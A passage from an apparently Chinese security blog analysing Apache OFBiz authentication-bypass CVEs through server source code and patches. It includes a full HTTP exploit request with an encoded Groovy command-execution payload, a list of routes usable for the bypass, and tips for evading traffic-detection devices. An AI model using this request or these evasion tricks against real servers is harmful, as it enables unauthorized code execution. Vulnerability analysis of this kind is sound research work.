&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String canonicalContextPath = getServletContext().getContextPath();</span><br><span class="line"></span><br><span class="line">    String uri = getRequestURI();</span><br><span class="line">    <span class="keyword">int</span> pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!getContext().getAllowMultipleLeadingForwardSlashInPath()) &#123;</span><br><span class="line">        <span class="comment">// Ensure that the returned value only starts with a single &#x27;/&#x27;.</span></span><br><span class="line">        <span class="comment">// This prevents the value being misinterpreted as a protocol-</span></span><br><span class="line">        <span class="comment">// relative URI if used with sendRedirect().</span></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            pos++;</span><br><span class="line">        &#125; <span class="keyword">while</span> (pos &lt; uri.length() &amp;&amp; uri.charAt(pos) == <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        pos--;</span><br><span class="line">        uri = uri.substring(pos);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>[] uriChars = uri.toCharArray();</span><br><span class="line">    <span class="comment">// Need at least the number of slashes in the context path</span></span><br><span class="line">    <span class="keyword">while</span> (lastSlash &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        pos = nextSlash(uriChars, pos + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (pos == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        lastSlash--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Now allow for path parameters, normalization and/or encoding.</span></span><br><span class="line">    <span class="comment">// Essentially, keep extending the candidate path up to the next slash</span></span><br><span class="line">    <span class="comment">// until the decoded and normalized candidate path (with the path</span></span><br><span class="line">    <span class="comment">// parameters removed) is the same as the canonical path.</span></span><br><span class="line">    String candidate;</span><br><span class="line">    <span class="keyword">if</span> (pos == -<span class="number">1</span>) &#123;</span><br><span class="line">        candidate = uri;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        candidate = uri.substring(<span class="number">0</span>, pos);</span><br><span class="line">    &#125;</span><br><span class="line">    candidate = removePathParameters(candidate);</span><br><span class="line">    candidate = UDecoder.URLDecode(candidate, connector.getURICharset());</span><br><span class="line">    candidate = org.apache.tomcat.util.http.RequestUtil.normalize(candidate);</span><br><span class="line">    <span class="keyword">boolean</span> match = canonicalContextPath.equals(candidate);</span><br><span class="line">    <span class="keyword">while</span> (!match &amp;&amp; pos != -<span class="number">1</span>) &#123;</span><br><span class="line">        pos = nextSlash(uriChars, pos + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (pos == -<span class="number">1</span>) &#123;</span><br><span class="line">            candidate = uri;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            candidate = uri.substring(<span class="number">0</span>, pos);</span><br><span class="line">        &#125;</span><br><span class="line">        candidate = removePathParameters(candidate);</span><br><span class="line">        candidate = UDecoder.URLDecode(candidate, connector.getURICharset());</span><br><span class="line">        candidate = org.apache.tomcat.util.http.RequestUtil.normalize(candidate);</span><br><span class="line">        match = canonicalContextPath.equals(candidate);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (match) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pos == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> uri;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> uri.substring(<span class="number">0</span>, pos);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Should never happen</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(</span><br><span class="line">                sm.getString(<span class="string">&quot;coyoteRequest.getContextPath.ise&quot;</span>, canonicalContextPath, uri));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="为什么这及个老漏洞利用必须要求登录"><a href="#为什么这及个老漏洞利用必须要求登录" class="headerlink" title="为什么这及个老漏洞利用必须要求登录"></a>为什么这及个老漏洞利用必须要求登录</h4><p>这是很多人都会犯错的地方，以为直接带个<code>../</code>就行了，事后问为什么我不能复现</p><p>以下面的数据包为例，通过低权限账号发包后替换Cookie中的JSESSIONID即可(但前提是一定要有账号，账号可以没有任何端点的访问权限)</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/y4tacker/../webtools/control/ProgramExport</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">X-Forwarded-Proto</span><span class="punctuation">: </span>HTTPS</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=BF2814CAF9E77F1F1C7A7DD49465D0B6.jvm1; Path=/webtools; HttpOnly</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>200</span><br><span class="line"></span><br><span class="line"><span class="apache"><span class="attribute">USERNAME</span>=y<span class="number">4</span>tacker&amp;PASSWORD=y<span class="number">4</span>tacker<span class="number">123</span>&amp;JavaScriptEnabled=Y&amp;groovyProgram=\u<span class="number">0022</span>\u<span class="number">006</span>f\u<span class="number">0070</span>\u<span class="number">0065</span>\u<span class="number">006</span>e\u<span class="number">0020</span>\u<span class="number">002</span>d\u<span class="number">006</span>e\u<span class="number">0061</span>\u<span class="number">0020</span>\u<span class="number">0043</span>\u<span class="number">0061</span>\u<span class="number">006</span>c\u<span class="number">0063</span>\u<span class="number">0075</span>\u<span class="number">006</span>c\u<span class="number">0061</span>\u<span class="number">0074</span>\u<span class="number">006</span>f\u<span class="number">0072</span>\u<span class="number">0022</span>\u<span class="number">002</span>e\u<span class="number">0065</span>\u<span class="number">0078</span>\u<span class="number">0065</span>\u<span class="number">0063</span>\u<span class="number">0075</span>\u<span class="number">0074</span>\u<span class="number">0065</span>\u<span class="number">0028</span>\u<span class="number">0029</span></span></span><br></pre></td></tr></table></figure><p>这时候就会有人问，这里不是都绕过<code>hasBasePermission</code>了么？为什么还需要密码？这里再带大家梳理一遍</p><ol><li><p>我们要利用的功能点<code>ProgramExport</code>(对应第二点提到的Path)其属性auth为<code>true</code>，代表需要鉴权，路由功能是通过path决定的(<code>requestMapMap.get(requestUri)</code>=&gt;<code>getRequestUri(path);</code>=&gt;<code>req.getPathInfo();</code>)</p></li><li><p>需要鉴权就需要通过extensionCheckLogin完成，在这个函数中先校验用户名密码</p></li><li><p>用户名密码正确，之后通过函数<code>hasBasePermission</code>判断是否有对应路径权限，而我们使用带<code>../</code>的路径绕过<code>hasBasePermission</code>权限校验</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.apache.ofbiz.webapp.control.RequestHandler#doRequest</span></span><br><span class="line">Collection&lt;RequestMap&gt; rmaps = resolveURI(ccfg, request);</span><br><span class="line"><span class="keyword">if</span> (rmaps.isEmpty()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (throwRequestHandlerExceptionOnMissingLocalRequest) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> RequestHandlerException(requestMissingErrorMessage);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> RequestHandlerExceptionAllowExternalRequests();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String method = request.getMethod();</span><br><span class="line">RequestMap requestMap = resolveMethod(method, rmaps).orElseThrow(() -&gt; &#123;</span><br><span class="line">    String msg = UtilProperties.getMessage(<span class="string">&quot;WebappUiLabels&quot;</span>, <span class="string">&quot;RequestMethodNotMatchConfig&quot;</span>,</span><br><span class="line">            UtilMisc.toList(requestUri, method), UtilHttp.getLocale(request));</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> MethodNotAllowedException(msg);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// org.apache.ofbiz.webapp.control.RequestHandler#resolveURI</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> Collection&lt;RequestMap&gt; <span class="title">resolveURI</span><span class="params">(ControllerConfig ccfg, HttpServletRequest req)</span> </span>&#123;</span><br><span class="line">    Map&lt;String, List&lt;RequestMap&gt;&gt; requestMapMap = ccfg.getRequestMapMap();</span><br><span class="line">    Map&lt;String, ConfigXMLReader.ViewMap&gt; viewMapMap = ccfg.getViewMapMap();</span><br><span class="line">    String defaultRequest = ccfg.getDefaultRequest();</span><br><span class="line">    String path = req.getPathInfo();</span><br><span class="line">    String requestUri = getRequestUri(path);</span><br><span class="line">    String viewUri = getOverrideViewUri(path);</span><br><span class="line">    Collection&lt;RequestMap&gt; rmaps;</span><br><span class="line">    <span class="keyword">if</span> (requestMapMap.containsKey(requestUri)</span><br><span class="line">            <span class="comment">// Ensure that overridden view exists.</span></span><br><span class="line">            &amp;&amp; (viewUri == <span class="keyword">null</span> || viewMapMap.containsKey(viewUri) </span><br><span class="line">            || (<span class="string">&quot;SOAPService&quot;</span>.equals(requestUri) &amp;&amp; <span class="string">&quot;wsdl&quot;</span>.equalsIgnoreCase(req.getQueryString()))))&#123;</span><br><span class="line">        rmaps = requestMapMap.get(requestUri);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (defaultRequest != <span class="keyword">null</span>) &#123;</span><br><span class="line">        rmaps = requestMapMap.get(defaultRequest);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        rmaps = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> rmaps != <span class="keyword">null</span> ? rmaps : Collections.emptyList();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>因此必须要有低权限账号，这个漏洞完成的只是低权限账号的权限提升</p><h3 id="CVE-2024-32113-CVE-2024-36104"><a href="#CVE-2024-32113-CVE-2024-36104" class="headerlink" title="CVE-2024-32113/CVE-2024-36104"></a>CVE-2024-32113/CVE-2024-36104</h3><p>从commit不难看出</p><p><a target="_blank" rel="noopener" href="https://github.com/apache/ofbiz-framework/commit/b91a9b7f26">https://github.com/apache/ofbiz-framework/commit/b91a9b7f26</a></p><p><a target="_blank" rel="noopener" href="https://github.com/apache/ofbiz-framework/commit/b3b87d98dd">https://github.com/apache/ofbiz-framework/commit/b3b87d98dd</a></p><p>聪明的开发者知道对contextPath做normalize处理</p><p><img src="/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/image-20240624002738505.png" alt="image-20240624002738505"></p><p><img src="/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/image-20240624004058286.png" alt="image-20240624004058286"></p><p>然而狡猾的黑客又聪明的次实现了绕过，毕竟无论是getRequestURI还getRequestURL都不会做url解码，另外也可以配合分号的使用绕过校验</p><p><img src="/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/image-20240624004152877.png" alt="image-20240624004152877"></p><p>这下开发者一个头两个大，最终还是通过正则完成了漏洞的修复</p><p><a target="_blank" rel="noopener" href="https://github.com/apache/ofbiz-framework/commit/d33ce31012">https://github.com/apache/ofbiz-framework/commit/d33ce31012</a></p><p><img src="/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/image-20240624004600901.png" alt="image-20240624004600901"></p><p>然而真的完结了么？</p><h2 id="CVE-2024-38856权限绕过浅析"><a href="#CVE-2024-38856权限绕过浅析" class="headerlink" title="CVE-2024-38856权限绕过浅析"></a>CVE-2024-38856权限绕过浅析</h2><p>接着上文埋下的坑，在对漏洞的分析过程中我发现一个有趣的点</p><p>在这里默认情况下我们渲染的视图为<code>nextRequestResponse.value</code>，说人话就是根据我们路由的返回结果来自动选择视图，这里分为三种情况</p><p>一种是定义了event的路由(通常是不需要鉴权的)，会根据对应event的执行结果决定渲染类型</p><p>另一种是没有定义event的路由，但security中auth为true的路由，会根据认证返回结果决定渲染类型</p><p>最后一种则是既没有定义event、又没有认证的路由，这种会直接取配置中success的结果对应的值作为渲染类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="string">&quot;view&quot;</span>.equals(nextRequestResponse.type)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (Debug.verboseOn()) Debug.logVerbose(<span class="string">&quot;[RequestHandler.doRequest]: Response is a view.&quot;</span> + showSessionId(request), <span class="keyword">module</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// check for an override view, only used if &quot;success&quot; = eventReturn</span></span><br><span class="line">                String viewName = (UtilValidate.isNotEmpty(overrideViewUri) &amp;&amp; (eventReturn == <span class="keyword">null</span> || <span class="string">&quot;success&quot;</span>.equals(eventReturn))) ? overrideViewUri : nextRequestResponse.value;</span><br><span class="line">                renderView(viewName, requestMap.securityExternalView, request, response, saveName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在这里我们不难看出如果变量overrideViewUri存在，并且事件返回为success，那么渲染的视图则为overrideViewUri的值，对于攻击者而言以上的几种情况，毫无疑问，我们自然是优先选择第三种未授权的情形</p><p>那么接下来我们就要看看overrideViewUri如何控制，对于非链式请求，其取值在两个地方存在，一是预处理当returnString不为success时，但是我们一开始简单给大家展示过这些预处理事件，通常对于正常访问来说这些校验都是直接通过的我们不必过多关注</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Invoke the pre-processor (but NOT in a chain)</span></span><br><span class="line">    <span class="keyword">for</span> (ConfigXMLReader.Event event: ccfg.getPreprocessorEventList().values()) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String returnString = <span class="keyword">this</span>.runEvent(request, response, event, <span class="keyword">null</span>, <span class="string">&quot;preprocessor&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (returnString == <span class="keyword">null</span> || <span class="string">&quot;none&quot;</span>.equalsIgnoreCase(returnString)) &#123;</span><br><span class="line">                interruptRequest = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="string">&quot;success&quot;</span>.equalsIgnoreCase(returnString)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!returnString.contains(<span class="string">&quot;:_protect_:&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> EventHandlerException(<span class="string">&quot;Pre-Processor event [&quot;</span> + event.invoke + <span class="string">&quot;] did not return &#x27;success&#x27;.&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123; <span class="comment">// protect the view normally rendered and redirect to error response view</span></span><br><span class="line">                    returnString = returnString.replace(<span class="string">&quot;:_protect_:&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (returnString.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        request.setAttribute(<span class="string">&quot;_ERROR_MESSAGE_&quot;</span>, returnString);</span><br><span class="line">                    &#125;</span><br><span class="line">                    eventReturn = <span class="keyword">null</span>;</span><br><span class="line">                    <span class="comment">// check to see if there is a &quot;protect&quot; response, if so it&#x27;s ok else show the default_error_response_view</span></span><br><span class="line">                    <span class="keyword">if</span> (!requestMap.requestResponseMap.containsKey(<span class="string">&quot;protect&quot;</span>)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (ccfg.getProtectView() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            overrideViewUri = ccfg.getProtectView();</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            overrideViewUri = EntityUtilProperties.getPropertyValue(<span class="string">&quot;security&quot;</span>, <span class="string">&quot;default.error.response.view&quot;</span>, delegator);</span><br><span class="line">                            overrideViewUri = overrideViewUri.replace(<span class="string">&quot;view:&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                            <span class="keyword">if</span> (<span class="string">&quot;none:&quot;</span>.equals(overrideViewUri)) &#123;</span><br><span class="line">                                interruptRequest = <span class="keyword">true</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (EventHandlerException e) &#123;</span><br><span class="line">            Debug.logError(e, <span class="keyword">module</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另一个就是程序一开头的代码片段中，分别通过path获取了requesturi以及overrideViewUri</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String path = request.getPathInfo();</span><br><span class="line">String requestUri = getRequestUri(path);</span><br><span class="line">String overrideViewUri = getOverrideViewUri(path);</span><br></pre></td></tr></table></figure><p>前者用于在resolveURI取得路由配置，后者则用于视图渲染，而如果我们仔细看这两个函数的实现我们会发现，requesturi取的是path第一个/及之后的值，而overrideViewUri取的是path第二个/及之后的值，看到这里我们不由发现，如果我们将path后第一个/后的路由设置为不鉴权且路由的type为view。而第二个/后的设置为需要利用的路由，那么我们便能实现权限的绕过了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Collection&lt;RequestMap&gt; <span class="title">resolveURI</span><span class="params">(ControllerConfig ccfg, HttpServletRequest req)</span> </span>&#123;</span><br><span class="line">    Map&lt;String, List&lt;RequestMap&gt;&gt; requestMapMap = ccfg.getRequestMapMap();</span><br><span class="line">    Map&lt;String, ConfigXMLReader.ViewMap&gt; viewMapMap = ccfg.getViewMapMap();</span><br><span class="line">    String defaultRequest = ccfg.getDefaultRequest();</span><br><span class="line">    String path = req.getPathInfo();</span><br><span class="line">    String requestUri = getRequestUri(path);</span><br><span class="line">    String viewUri = getOverrideViewUri(path);</span><br><span class="line">    Collection&lt;RequestMap&gt; rmaps;</span><br><span class="line">    <span class="keyword">if</span> (requestMapMap.containsKey(requestUri)</span><br><span class="line">            <span class="comment">// Ensure that overridden view exists.</span></span><br><span class="line">            &amp;&amp; (viewUri == <span class="keyword">null</span> || viewMapMap.containsKey(viewUri)</span><br><span class="line">            || (<span class="string">&quot;SOAPService&quot;</span>.equals(requestUri) &amp;&amp; <span class="string">&quot;wsdl&quot;</span>.equalsIgnoreCase(req.getQueryString()))))&#123;</span><br><span class="line">        rmaps = requestMapMap.get(requestUri);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (defaultRequest != <span class="keyword">null</span>) &#123;</span><br><span class="line">        rmaps = requestMapMap.get(defaultRequest);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        rmaps = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> rmaps != <span class="keyword">null</span> ? rmaps : Collections.emptyList();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getRequestUri</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">    List&lt;String&gt; pathInfo = StringUtil.split(path, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (UtilValidate.isEmpty(pathInfo)) &#123;</span><br><span class="line">        Debug.logWarning(<span class="string">&quot;Got nothing when splitting URI: &quot;</span> + path, <span class="keyword">module</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pathInfo.get(<span class="number">0</span>).indexOf(<span class="string">&#x27;?&#x27;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> pathInfo.get(<span class="number">0</span>).substring(<span class="number">0</span>, pathInfo.get(<span class="number">0</span>).indexOf(<span class="string">&#x27;?&#x27;</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> pathInfo.get(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getOverrideViewUri</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">    List&lt;String&gt; pathItemList = StringUtil.split(path, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pathItemList == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pathItemList = pathItemList.subList(<span class="number">1</span>, pathItemList.size());</span><br><span class="line"></span><br><span class="line">    String nextPage = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">for</span> (String pathItem: pathItemList) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pathItem.indexOf(<span class="string">&#x27;~&#x27;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pathItem.indexOf(<span class="string">&#x27;?&#x27;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">                pathItem = pathItem.substring(<span class="number">0</span>, pathItem.indexOf(<span class="string">&#x27;?&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            nextPage = (nextPage == <span class="keyword">null</span> ? pathItem : nextPage + <span class="string">&quot;/&quot;</span> + pathItem);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nextPage;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="可利用的点"><a href="#可利用的点" class="headerlink" title="可利用的点"></a>可利用的点</h2><p>根据以上的分析其实可利用的点有很多，简单写一个xml解析工具提取，以下结果以<code>|</code>分隔，不一定都能用，简单跑了一下xml程序解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secureCertDateTime|view|main|checkLogin|ajaxCheckLogin|login|forgotPassword|forgotPasswordReset|ListLocales|ListTimezones|ListSetCompanies|showHelpPublic|getUiLabels|editPortalPageColumnWidth|FixedAssetSearchResults|BudgetSearchResults|reconcileFinAccountTrans|assignGlRecToFinAccTrans|addGiftCertificateSurvey|addCategoryDefaults|crosssell|ViewSimpleContent|ViewSimpleContent|createWebSiteContactList|updateWebSiteContactList|deleteWebSiteContactList|viewImage|listMiniproduct|FacilitySearchResults|contactListOptOut|createWebSiteContactList|updateWebSiteContactList|deleteWebSiteContactList</span><br></pre></td></tr></table></figure><h2 id="对抗流量设备的点"><a href="#对抗流量设备的点" class="headerlink" title="对抗流量设备的点"></a>对抗流量设备的点</h2><p>围绕以下两个函数即可，可以在路由中添加<code>~</code>之类的做分隔，当然还有其他姿势这里就不展开了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getRequestUri</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">    List&lt;String&gt; pathInfo = StringUtil.split(path, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (UtilValidate.isEmpty(pathInfo)) &#123;</span><br><span class="line">        Debug.logWarning(<span class="string">&quot;Got nothing when splitting URI: &quot;</span> + path, <span class="keyword">module</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pathInfo.get(<span class="number">0</span>).indexOf(<span class="string">&#x27;?&#x27;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> pathInfo.get(<span class="number">0</span>).substring(<span class="number">0</span>, pathInfo.get(<span class="number">0</span>).indexOf(<span class="string">&#x27;?&#x27;</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> pathInfo.get(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getOverrideViewUri</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">    List&lt;String&gt; pathItemList = StringUtil.split(path, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pathItemList == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pathItemList = pathItemList.subList(<span class="number">1</span>, pathItemList.size());</span><br><span class="line"></span><br><span class="line">    String nextPage = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">for</span> (String pathItem: pathItemList) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pathItem.indexOf(<span class="string">&#x27;~&#x27;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pathItem.indexOf(<span class="string">&#x27;?&#x27;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">                pathItem = pathItem.substring(<span class="number">0</span>, pathItem.indexOf(<span 